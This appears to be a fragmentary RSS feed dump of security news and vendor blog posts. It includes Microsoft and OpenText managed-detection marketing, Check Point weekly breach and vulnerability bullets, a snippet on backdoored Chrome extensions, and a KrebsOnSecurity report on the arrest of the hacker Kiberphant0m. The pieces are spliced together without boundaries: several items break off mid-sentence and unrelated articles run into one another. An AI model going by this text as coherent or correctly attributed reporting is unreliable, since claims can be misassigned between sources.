&lt;div class="wp-block-msxcm-kicker-container"&gt;
	&lt;div class=" wp-block-msxcm-kicker-block wp-block-msxcm-kicker--align-left"&gt;
		&lt;p class="wp-block-msxcm-kicker__title small text-neutral-400 text-uppercase"&gt;
			What is phishing?		&lt;/p&gt;
		&lt;a class="wp-block-msxcm-kicker__cta btn btn-link p-0 text-decoration-none" href="https://www.microsoft.com/security/business/security-101/what-is-phishing"&gt;
			&lt;span&gt;Learn more&lt;/span&gt; &lt;span class="glyph-append glyph-append-xsmall wp-block-msxcm-kicker__glyph glyph-append-go"&gt;&lt;/span&gt;
		&lt;/a&gt;
	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;CISOs and security teams know that phishing attacks continue to rise because cybercriminals are finding success. Email remains the most common method for phishing attacks, with 91% of all cyberattacks beginning with a phishing email. Phishing is the primary method for delivering ransomware, accounting for 45% of all ransomware attacks. Financial institutions are most targeted at 27.7% followed by nearly all other industries.&lt;sup&gt;5&lt;/sup&gt;&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;According to internal Microsoft Defender Experts for XDR statistics, roughly 40% of halted threats are phishing.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Microsoft Defender Experts for XDR is a managed extended detection and response service (MXDR). MXDR is an evolution of traditional MDR services, which primarily focuses on endpoints. Our MXDR service has greater protection across endpoints, email and productivity tools, identities, and cloud apps—ensuring the detection and disruption of many cyberthreats, such as phishing, that would not be covered by endpoint-only managed services. That expanded and consolidated coverage enables Microsoft Defender Experts for XDR to find even the most emergent threats. For example, our in-house team identified and disrupted a significant Octo Tempest operation that was working across previously siloed domains. &lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;The reduction in the likelihood of breaches with Microsoft Defender Experts for XDR is roughly 20% and is worth $261,000 to $522,000 over three years with Defender Experts.&lt;sup&gt;4&lt;/sup&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;In addition to detecting, triaging, and responding to cyberthreats, Microsoft Defender Experts for XDR publishes insights to keep organizations secure. That includes recent blogs on file hosting services abuse and phishing abuse of remote monitoring and management tools. As well, the MXDR service vetted roughly 45 indicators related to adversary-in-the-middle, password spray, and multifactor authentication fatigue and added them to Spectre to help keep organizations secure.&lt;/p&gt;



&lt;p&gt;From September 2024 through November 2024, Microsoft Security published multiple cyberthreat articles covering real-world exploration topics such as Roadtools, AzureHound, Fake Palo Alto GlobalProtect, AsyncRAT via ScreenConnect, Specula C2 Framework, SectopRAT campaign, Selenium Grid for Cryptomining, and Specula.&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;“The Microsoft MXDR service, Microsoft Defender Experts for XDR, is helping our SOC team around the clock and taking our security posture to the next level. On our second day of using the service, there was an alert we had previously dismissed, but Microsoft continued the investigation and identified a machine in our environment that was open to the internet. It was created by a threat actor using a remote desktop protocol (RDP). Microsoft Defender Experts for XDR&amp;#8217;s MXDR investigation and response to remediate the issue was immediately valuable to us.”&lt;/em&gt;&lt;/p&gt;

&lt;/div&gt;



&lt;h3 class="wp-block-heading" id="halt-cyberthreats-before-they-do-damage"&gt;Halt cyberthreats before they do damage&lt;/h3&gt;



&lt;p&gt;In 2024 the mean time for the average organization to identify a breach was 194 days and containment 64 days.&lt;sup&gt;6  &lt;/sup&gt;Organizations must proactively look for cyberattackers across unified cross-domain telemetry versus relying solely on disparate product alerts. Proactive threat hunting is no longer a nice-to-have in an organization’s security practice. It’s a must-have to detect cyberthreats faster before they can do significant harm.&lt;/p&gt;



&lt;p&gt;When every minute counts, Microsoft Defender Experts for XDR can help speed up the detection of an intrusion with proactive threat hunting informed by Microsoft’s threat intelligence, which tracks more than 1,500 unique cyberthreat groups and correlates insights from 78 trillion security signals per day.&lt;sup&gt;7&lt;/sup&gt;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/services/microsoft-defender-experts-hunting"&gt;Microsoft Defender Experts for Hunting&lt;/a&gt; proactively looks for threats around the clock across endpoints, email, identity, and cloud apps using Microsoft Defender and other signals. Threat hunting leverages advanced AI and human expertise to probe deeper and rapidly correlate and expose cyberthreats across an organization&amp;#8217;s security stack. With visibility across diverse, cross-domain telemetry and threat intelligence, Microsoft Defender Experts for Hunting extends in-house threat hunting capabilities to provide an additional layer of threat detection to improve a SOC&amp;#8217;s overall threat response and security efficacy.&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;In a recent survey, 63% of organizations saw a measurable improvement in their security posture with threat hunting. 49% saw a reduction in network and endpoint attacks along with more accurate threat detection and a reduction of false positives.&lt;sup&gt;8&lt;/sup&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Microsoft Defender Experts for Hunting enables organizations to detect and mitigate cyberthreats such as advanced persistent threats or zero-day vulnerabilities. By actively seeking out hidden risks and reducing dwell time, threat hunting minimizes potential damage, enhances incident response, and strengthens overall security posture. &lt;/p&gt;



&lt;p&gt;Microsoft Defender Experts for XDR, which includes Microsoft Defender Experts for Hunting, allows customers to stay ahead of sophisticated threat actors, uncover gaps in defenses, and adapt to an ever-evolving cyberthreat landscape.&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;“Managed threat hunting services detect and address security threats before they become major incidents, reducing potential damage. By implementing this (Defender Experts for Hunting), we enhance our cybersecurity posture by having experts who continuously look for hidden threats, ensuring the safety of our data, reputation, and customer trust.” &lt;/em&gt;&lt;/p&gt;



&lt;p&gt;—CISO, technology industry&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h3 class="wp-block-heading" id="spend-less-to-get-more"&gt;Spend less to get more&lt;/h3&gt;



&lt;p&gt;Microsoft Defender Experts for XDR helps CISOs do more with their security budgets.

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/01/06/6-reasons-why-smbs-love-opentext-mdr/" rel="nofollow"&gt;6 reasons why SMBs love OpenText MDR&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;In today’s digital-first world, small and medium-sized businesses (SMBs) face cybersecurity challenges that grow more complex by the day. SMBs are prime targets for attackers hoping to gain a foothold inside any organization that doesn’t have extensive security measures. As threats increase, so does the need for comprehensive, reliable, and accessible protection.&lt;/p&gt;



&lt;p&gt;This is where managed detection and response (MDR) services come in. MDR combines threat detection, investigation, and response, offering businesses the support from a team of security experts who monitor the environment 24/7 to identify and respond to threats. For many SMBs, MDR is an ideal solution because it provides a level of protection and expertise that would otherwise require building an in-house security operations center (SOC).&lt;/p&gt;



&lt;p&gt;With OpenText MDR, SMBs get exactly this level of protection, backed by a trusted name in cybersecurity. Delivered through our extensive network of leading MSPs, OpenText MDR offers the power of an enterprise-grade SOC, helping SMBs fortify their defenses, protect their data, and stay operational no matter the time of day.&lt;/p&gt;



&lt;p&gt;SMBs are turning to OpenText MDR for several key reasons that make a difference in their security approach:&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. 24/7/365 monitoring and threat response&lt;/h2&gt;



&lt;p&gt;Cyber threats don’t follow a 9-to-5 schedule—they’re more likely to strike after hours or on weekends, when in-house teams may be offline. That’s why around-the-clock protection is crucial.&lt;/p&gt;



&lt;p&gt;Working together with your MSP, OpenText provides robust, continuous protection supported by a skilled team of security experts. This around-the-clock vigilance offers invaluable peace of mind, knowing that security professionals are actively monitoring and defending your infrastructure from evolving threats, day and night.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;2. Fast incident response&lt;/h2&gt;



&lt;p&gt;In the face of a cyber-attack, every second matters, and a rapid response can mean the difference between a minor incident and a major disruption.&lt;/p&gt;



&lt;p&gt;With dedicated analysts for investigation and escalation within 15 minutes, OpenText MDR collaborates seamlessly with your MSP to deliver rapid incident response within critical time frames. This swift action minimizes potential damage, safeguards business continuity, and helps companies avoid costly disruptions.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;3. Meet regulatory compliance requirements&lt;/h2&gt;



&lt;p&gt;Compliance can be tough, especially for SMBs with limited resources. OpenText MDR makes it easier by helping businesses meet key standards like NIST, PCI, HIPAA, and SOC 2.&lt;/p&gt;



&lt;p&gt;With built-in security controls, reporting, and documentation, OpenText helps protect customer data, reduce risks, and keep you clear of costly fines. Plus, it frees up your team to focus on running the business, knowing that OpenText MDR is supporting your compliance requirements.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;4. Low total cost of ownership (TCO)&lt;/h2&gt;



&lt;p&gt;Building an in-house SOC requires a significant investment that goes beyond just the initial setup. The costs quickly add up when factoring in the specialized hardware, advanced software, and the need to recruit and retain highly skilled security professionals. For many SMBs, these expenses are simply out of reach, which makes it challenging to keep up with the level of protection needed to guard against sophisticated cyber threats.&lt;/p&gt;



&lt;p&gt;OpenText MDR solves this by offering a fully managed or co-managed SOC-as-a-Service model through your MSP, which cuts down on costs by eliminating the need for an in-house infrastructure and dedicated security team. With OpenText MDR, businesses can optimize their security budget without sacrificing the level of protection that’s required to counteract today’s cyber threats.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;5. Enhanced protection beyond endpoint security&lt;/h2&gt;



&lt;p&gt;SMBs are increasingly investing in endpoint security, which is a crucial first step. However, today’s sophisticated adversaries often bypass these initial defenses, making it critical to have more than endpoint security alone.&lt;/p&gt;



&lt;p&gt;OpenText MDR enhances an organization’s existing endpoint protection by integrating AI-driven automation, SOAR workflows, and a turnkey cloud SIEM into the security environment. This enables active monitoring and protection across the attack surface, while automating threat response and accelerating remediation times. With OpenText MDR, businesses benefit from a comprehensive, streamlined security service that operates continuously, working smarter, faster, and more efficiently to safeguard against evolving threats.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;6. Advanced threat intelligence and threat hunting&lt;/h2&gt;



&lt;p&gt;Cyber threats are constantly evolving, and OpenText MDR stays ahead with threat intelligence from over 35 sources worldwide. SMBs gain valuable insights into emerging threats and can protect their business with OpenText’s security experts conducting threat hunting to proactively identify and neutralize potential risks before they escalate. This intelligence-driven approach provides an essential security practice that gives businesses the edge to thwart sophisticated attacks.&lt;/p&gt;



&lt;p&gt;Cyber-attacks can bring business operations to a grinding halt, leading to reputational damage and substantial financial loss. In this climate, having a trusted security partner like OpenText—a provider known for its reliable and innovative security solutions—is essential for businesses looking to stay secure, resilient, and prepared for whatever cyber threats may come their way.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point &lt;a href="https://blog.checkpoint.com/security/what-you-need-to-know-about-the-us-treasury-breach-and-how-to-protect-your-organization-from-a-major-incident/"&gt;elaborated&lt;/a&gt; on the US Treasury Department cyber-attack that compromised employee workstations and classified documents. The breach, attributed to a China state-sponsored threat actor, involved unauthorized remote access using a security key from third-party provider BeyondTrust. The attackers exploited two vulnerabilities in BeyondTrust’s remote support software: CVE-2024-12356, critical API access flaw, and CVE-2024-12686, token management vulnerability.&lt;/li&gt;
&lt;li&gt;Japan’s largest mobile carrier, NTT Docomo, has &lt;a href="https://www.techradar.com/pro/security/japans-largest-telco-ntt-docomo-disrupted-by-ddos-attack"&gt;been&lt;/a&gt; a victim of a distributed denial-of-service (DDoS) attack that disrupted multiple of its services for 12 hours, including news, video streaming, mobile payments, and webmail. No threat actor has claimed responsibility yet.&lt;/li&gt;
&lt;li&gt;UK photography company DEphoto has &lt;a href="https://databreaches.net/2025/01/01/hacked-on-christmas-dephoto-starts-notifying-customers-only-to-be-attacked-again/"&gt;suffered&lt;/a&gt; a security breach. The threat actor behind the attack claims to have exfiltrated the personal information of more than 500,000 of the company’s customers, including over 15,000 records which contain full unredacted payment card information. The company has begun notifying its customers of their data being leaked.&lt;/li&gt;
&lt;li&gt;Campaign &lt;a href="https://www.bleepingcomputer.com/news/security/new-details-reveal-how-hackers-hijacked-35-google-chrome-extensions/"&gt;targeting&lt;/a&gt; Chrome extension developers, led to the compromise of at least thirty-five browser extensions. The threat actors aim to gain developer credentials to the extensions to replace them with malicious versions. The compromised extensions were collectively used by more than 2.5 million users.&lt;/li&gt;
&lt;li&gt;Space Bears ransomware gang &lt;a href="https://therecord.media/atos-dismisses-ransomware-claims"&gt;took&lt;/a&gt; credit for an alleged cyber-attack on ​French tech giant Atos, which secures communications for France’s military and intelligence services. The gang claimed to have compromised the company’s internal database and threatened to leak proprietary data. Atos has dismissed these claims as unfounded, stating that no infrastructure managed by the company was breached and no sensitive data was exposed.&lt;/li&gt;
&lt;li&gt;Websites of multiple French cities, including Marseille and Nantes, have &lt;a href="https://dailysecurityreview.com/security-spotlight/cyber-attacks-hit-french-internet-sites-multiple-cities-targeted-in-pro-russia-hack/"&gt;been&lt;/a&gt; victims of DDoS attacks that resulted in widespread website outages and service disruptions. The attacks affected 23 municipal sites, making them temporarily inaccessible to millions of users. The attacks were claimed by the pro-Russian hacktivist group NoName057(16).&lt;/li&gt;
&lt;li&gt;Iran-linked hacktivist group Handala has &lt;a href="https://x.com/Handala_Backup/status/1874716996568523072"&gt;claimed&lt;/a&gt; responsibility for a supply chain attack targeting Israeli companies via ReutOne, a CRM solutions provider and Microsoft 365 Dynamics reseller. The group alleges access to databases containing personal information from multiple companies in Israel, France, and Ukraine. Researchers &lt;a href="https://doublepulsar.com/handala-attempts-a-supply-chain-hack-via-reutone-001aa3cc684f"&gt;revealed&lt;/a&gt; the attack involved malicious software updates that collected system data and enabled unauthorized access and data exfiltration.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A proof-of-concept exploit named &amp;#8220;LDAPNightmare&amp;#8221; has been &lt;a href="https://www.safebreach.com/blog/ldapnightmare-safebreach-labs-publishes-first-proof-of-concept-exploit-for-cve-2024-49113/"&gt;published&lt;/a&gt;, targeting an out-of-bounds read vulnerability CVE-2024-49113 in Windows Lightweight Directory Access Protocol (LDAP). This exploit can crash the Local Security Authority Subsystem Service (LSASS) on unpatched Windows Servers, leading to a system reboot. The same exploit chain can be modified to achieve remote code execution, corresponding to CVE-2024-49112, which has a CVSS score of 9.8.&lt;/li&gt;
&lt;li&gt;DoubleClickjacking, a newly identified vulnerability, &lt;a href="https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html"&gt;evades&lt;/a&gt; existing clickjacking protections on major websites by leveraging a double-click sequence to manipulate user interactions. This vulnerability allows attackers to perform UI manipulation and account takeovers by stealthily redirecting users during the double-click process, potentially affecting virtually all major web applications.&lt;/li&gt;
&lt;li&gt;Progress Software Corporation has &lt;a href="https://securityonline.info/cve-2024-12108-whatsup-gold-network-monitoring-software/"&gt;issued&lt;/a&gt; an advisory, addressing three vulnerabilities in its WhatsUp Gold network monitoring platform. Two of the vulnerabilities, CVE-2024-12106 and CVE-2024-12108, are considered critical. The first allows unauthenticated attackers to configure LDAP settings, while the second allows complete remote takeover of the WhatsUp Gold server.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PLAYFULGHOST, a new backdoor that shares functionality with Gh0st RAT, has &lt;a href="https://www.googlecloudcommunity.com/gc/Community-Blog/Finding-Malware-Unveiling-PLAYFULGHOST-with-Google-Security/ba-p/850676"&gt;been&lt;/a&gt; distributed via phishing emails and SEO poisoning, resulting in the compromise of users&amp;#8217; systems through trojanized VPN applications like LetsVPN. The malware enables attackers to collect sensitive data, including keystrokes, screenshots, audio recordings, and system information, potentially leading to unauthorized access and data breaches.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(RAT.Win.Gh0st; Trojan.Wins.Gh0st.ta.*)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://socket.dev/blog/malicious-npm-campaign-targets-ethereum-developers"&gt;uncovered&lt;/a&gt; a malicious npm campaign targeting the Nomic Foundation and Hardhat platforms, two integral components of the Ethereum development ecosystem. The campaign involves 20 malicious packages which impersonate legitimate plugins to inject data-stealing code, exfiltrating sensitive information such as private keys and mnemonics, and leverage Ethereum smart contracts to dynamically retrieve command-and-control server addresses.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.cyfirma.com/research/inside-firescam-an-information-stealer-with-spyware-capabilities/"&gt;identified&lt;/a&gt; a new Android malware named FireScam, disguised as a premium version of the Telegram app. Distributed via phishing websites mimicking Russia&amp;#8217;s RuStore app market, FireScam uses a dropper module to install the malicious &amp;#8216;Telegram Premium.apk&amp;#8217;. It then requests extensive permissions to monitor notifications, access clipboard data and intercept SMS services.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.cyfirma.com/research/noneclid-rat/"&gt;discovered&lt;/a&gt; NonEuclid RAT, a sophisticated C# malware that enables unauthorized remote control of victim computers. It uses advanced evasion techniques like antivirus bypass, privilege escalation, and dynamic DLL loading. NonEuclid RAT also includes ransomware encryption targeting critical files and is promoted in underground forums and social media.&lt;/li&gt;

&lt;p&gt;The compromises came to light with the &lt;a href="https://www.vulnu.com/p/breaking-cyberhaven-chrome-extension-compromised"&gt;discovery&lt;/a&gt; by data loss prevention service Cyberhaven that a Chrome extension used by &lt;a href="https://web.archive.org/web/20241227171802/https://chromewebstore.google.com/detail/cyberhaven-security-exten/pajkjnmeojmbapicmbpliphjmcekeaac"&gt;400,000&lt;/a&gt; of its customers had been updated with code that stole their sensitive data.&lt;/p&gt;
&lt;h2&gt;’Twas the night before Christmas&lt;/h2&gt;
&lt;p&gt;The malicious extension, available as version 24.10.4, was available for 31 hours, from December 25 at 1:32 AM UTC to Dec 26 at 2:50 AM UTC. Chrome browsers actively running Cyberhaven during that window would automatically download and install the malicious code. Cyberhaven responded by issuing version 24.10.5, and 24.10.6 a few days later.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/dozens-of-backdoored-chrome-extensions-discovered-on-2-6-million-devices/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

As first reported by KrebsOnSecurity last month, the accused is a communications specialist who was recently stationed in South Korea.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69974" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-69974" height="743" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/camwagenius-selfie.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69974"&gt;One of several selfies on the Facebook page of Cameron Wagenius.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Cameron John Wagenius&lt;/strong&gt; was arrested near the Army base in Fort Hood, Texas on Dec. 20, after being indicted on two criminal counts of unlawful transfer of confidential phone records.&lt;/p&gt;
&lt;p&gt;The sparse, &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2024/12/wagenius-indictment.pdf" rel="noopener" target="_blank"&gt;two-page indictment&lt;/a&gt; (PDF) doesn&amp;#8217;t reference specific victims or hacking activity, nor does it include any personal details about the accused. But a conversation with Wagenius&amp;#8217; mother &amp;#8212; Minnesota native &lt;strong&gt;Alicia Roen &lt;/strong&gt;&amp;#8212; filled in the gaps.&lt;/p&gt;
&lt;p&gt;Roen said that prior to her son&amp;#8217;s arrest he&amp;#8217;d acknowledged being associated with &lt;strong&gt;Connor Riley Moucka&lt;/strong&gt;, a.k.a. &amp;#8220;&lt;strong&gt;Judische&lt;/strong&gt;,&amp;#8221; a prolific cybercriminal from Canada who was &lt;a href="https://krebsonsecurity.com/2024/11/canadian-man-arrested-in-snowflake-data-extortions/" rel="noopener" target="_blank"&gt;arrested in late October&lt;/a&gt; for stealing data from and extorting dozens of companies that stored data at the cloud service &lt;strong&gt;Snowflake&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In an interview with KrebsOnSecurity, Judische said he had no interest in selling the data he&amp;#8217;d stolen from Snowflake customers and telecom providers, and that he preferred to outsource that to Kiberphant0m and others. Meanwhile, Kiberphant0m claimed in posts on Telegram that he was responsible for hacking into at least 15 telecommunications firms, including AT&amp;amp;T and Verizon.&lt;/p&gt;
&lt;p&gt;On November 26, KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2024/11/hacker-in-snowflake-extortions-may-be-a-u-s-soldier/" rel="noopener" target="_blank"&gt;published a story&lt;/a&gt; that followed a trail of clues left behind by Kiberphantom indicating he was a U.S. Army soldier stationed in South Korea.&lt;/p&gt;
&lt;p&gt;Ms. Roen said Cameron worked on radio signals and network communications at an Army base in South Korea for the past two years, returning to the United States periodically. She said Cameron was always good with computers, but that she had no idea he might have been involved in criminal hacking.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I never was aware he was into hacking,&amp;#8221; Roen said. &amp;#8220;It was definitely a shock to me when we found this stuff out.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Ms. Roen said Cameron joined the Army as soon as he was of age, following in his older brother&amp;#8217;s footsteps.&lt;/p&gt;
&lt;p&gt;&amp;#8220;He and his brother when they were like 6 and 7 years old would ask for MREs from other countries,&amp;#8221; she recalled, referring to military-issued &amp;#8220;meals ready to eat&amp;#8221; food rations. &amp;#8220;They both always wanted to be in the Army. I&amp;#8217;m not sure where things went wrong.&amp;#8221;&lt;span id="more-69925"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Immediately after news broke of Moucka’s arrest, Kiberphant0m posted on the hacker community &lt;strong&gt;BreachForums&lt;/strong&gt; what they claimed were the AT&amp;amp;T call logs for &lt;strong&gt;President-elect&lt;/strong&gt; &lt;strong&gt;Donald J. Trump&lt;/strong&gt; and for &lt;strong&gt;Vice President Kamala Harris&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;“In the event you do not reach out to us @ATNT all presidential government call logs will be leaked,” Kiberphant0m threatened, signing their post with multiple “#FREEWAIFU” tags. “You don’t think we don’t have plans in the event of an arrest? Think again.”&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69624" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-69624" height="239" src="https://krebsonsecurity.com/wp-content/uploads/2024/11/kiberphant0m-nsa-schema.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69624"&gt;Kiberphant0m posting what he claimed was a &amp;#8220;data schema&amp;#8221; stolen from the NSA via AT&amp;amp;T.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;On that same day, Kiberphant0m posted what they claimed was the “data schema” from the &lt;strong&gt;U.S. National Security Agency&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;On Nov. 5, Kiberphant0m offered call logs stolen from Verizon’s push-to-talk (PTT) customers — mainly U.S. government agencies and emergency first responders. On Nov. 9, Kiberphant0m posted a sales thread on BreachForums offering a “SIM-swapping” service targeting Verizon PTT customers. In a SIM-swap, fraudsters use credentials that are phished or stolen from mobile phone company employees to divert a target’s phone calls and text messages to a device they control.&lt;/p&gt;
&lt;p&gt;The profile photo on Wagenius&amp;#8217; Facebook page was deleted within hours of my Nov. 26 story identifying Kiberphant0m as a likely U.S. Army soldier. Still, many of his original profile photos remain, including several that show Wagenius in uniform while holding various Army-issued weapons.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69972" style="width: 612px;"&gt;&lt;img alt="" class=" wp-image-69972" height="842" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/wagenius-fb.png" width="602" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69972"&gt;Several profile photos visible on the Facebook page of Cameron Wagenius.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;November&amp;#8217;s story on Kiberphant0m cited his own Telegram messages saying he maintained a large botnet that was used for distributed denial-of-service (DDoS) attacks to knock websites, users and networks offline. In 2023, Kiberphant0m sold remote access credentials for a major U.S. defense contractor.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Allison Nixon,&lt;/strong&gt; chief research officer at the New York-based cybersecurity firm &lt;a href="https://www.unit221b.com" rel="noopener" target="_blank"&gt;Unit 221B&lt;/a&gt;, helped track down Kiberphant0m&amp;#8217;s real life identity. Nixon was among several security researchers who faced harassment and specific threats of violence from Judische and his associates.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Anonymously extorting the President and VP as a member of the military is a bad idea, but it&amp;#8217;s an even worse idea to harass people who specialize in de-anonymizing cybercriminals,&amp;#8221; Nixon told KrebsOnSecurity. She said the investigation into Kiberphant0m shows that law enforcement is getting better and faster at going after cybercriminals &amp;#8212; especially those who are actually living in the United States.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Between when we, and an anonymous colleague, found his opsec mistake on November 10th to his last Telegram activity on December 6, law enforcement set the speed record for the fastest turnaround time for an American federal cyber case that I have witnessed in my career,&amp;#8221; she said.&lt;/p&gt;
&lt;p&gt;Nixon asked to share a message for all the other Kiberphant0ms out there who think they can&amp;#8217;t be found and arrested.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I know that young people involved in cybercrime will read these articles,&amp;#8221; Nixon said. &amp;#8220;You need to stop doing stupid shit and get a lawyer. Law enforcement wants to put all of you in prison for a long time.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The indictment against Wagenius was filed in Texas, but the case has been transferred to the U.S. District Court for the Western District of Washington in Seattle.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=69925</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Allison Nixon</category><category>Cameron John Wagenius</category><category>Connor Riley Moucka</category><category>Judische</category><category>Kiberphant0m</category><category>Unit 221B</category></item><item><title>VyprVPN Review (2025): Can It Still Perform This Year and Beyond?</title><link>https://www.techrepublic.com/article/vyprvpn-review/</link><description>VyprVPN is an affordable VPN provider, but is it trustworthy enough to keep your data secure?

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Clop ransomware gang &lt;a href="https://www.bleepingcomputer.com/news/security/clop-ransomware-is-now-extorting-66-cleo-data-theft-victims/"&gt;exploited&lt;/a&gt; a zero-day vulnerability (CVE-2024-50623) in Cleo&amp;#8217;s Secure File Transfer products and is extorting 66 companies following alleged data theft. The attackers have given the victims 48 hours to initiate ransom negotiations before publicly disclosing their identities. This incident mirrors Clop&amp;#8217;s previous exploitation of zero-day flaws in platforms like Accellion FTA, GoAnywhere MFT, and MOVEit Transfer.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint, Threat Emulation and IPS provide protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Win.Clop; Ransomware.Wins.Clop; Ransomware.Wins.Clop.ta.* ; Cleo Arbitrary File Upload (CVE-2024-50623))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Pittsburgh Regional Transit (PRT) &lt;a href="https://securityaffairs.com/172333/cyber-crime/pittsburgh-regional-transit-ransomware-attack.html"&gt;experienced&lt;/a&gt; a ransomware attack last week, resulting in service disruptions to its rail system and customer service operations. While transit services have resumed normal operations, certain rider services, such as processing ConnectCards, remain affected. The investigation, involving law enforcement and cybersecurity experts, is ongoing, with no confirmation yet regarding data theft or the group responsible for the attack.&lt;/li&gt;
&lt;li&gt;Cyberhaven has been a &lt;a href="https://www.cyberhaven.com/engineering-blog/cyberhavens-preliminary-analysis-of-the-recent-malicious-chrome-extension"&gt;victim&lt;/a&gt; of a cyber-attack that resulted in distribution of a malicious update for its Chrome browser extension. The compromised extension was able to exfiltrate users&amp;#8217; sensitive information, including authenticated sessions and cookies.&lt;/li&gt;
&lt;li&gt;Cariad, Volkswagen&amp;#8217;s automotive software subsidiary, &lt;a href="https://www.bleepingcomputer.com/news/security/customer-data-from-800-000-electric-cars-and-owners-exposed-online/"&gt;exposed&lt;/a&gt; data from 800,000 electric cars, including sensitive geo-location information, due to misconfigured IT applications. The exposed data included details of vehicles from VW, Seat, Audi, and Skoda, with precise locations for 460,000 cars and pseudonymized user data. The Chaos Computer Club identified the vulnerability, enabling access to terabytes of unprotected customer information stored in Amazon cloud storage.&lt;/li&gt;
&lt;li&gt;Japan Airlines has &lt;a href="https://www.reuters.com/technology/cybersecurity/japan-airlines-systems-hit-by-cyberattack-ntv-says-2024-12-26/?utm_source=chatgpt.com"&gt;resumed&lt;/a&gt; to normal activity following a cyberattack that caused delays in domestic and international flights. The attack involved a sudden surge in network traffic, indicative of a distributed denial-of-service (DDoS) attack, affecting data communication with external systems. No customer information was leaked, and flight safety remained uncompromised.&lt;/li&gt;
&lt;li&gt;ZAGG Inc., a consumer electronics accessories maker, has &lt;a href="https://cyberinsider.com/mobile-accessories-maker-zagg-says-breach-exposed-customer-credit-cards/"&gt;disclosed&lt;/a&gt; a data breach resulting in the exposure of customers&amp;#8217; payment card information. The breach occurred between October and November 2024, due to malicious code injected into the FreshClick app, a third-party application provided by their e-commerce platform, BigCommerce.&lt;/li&gt;
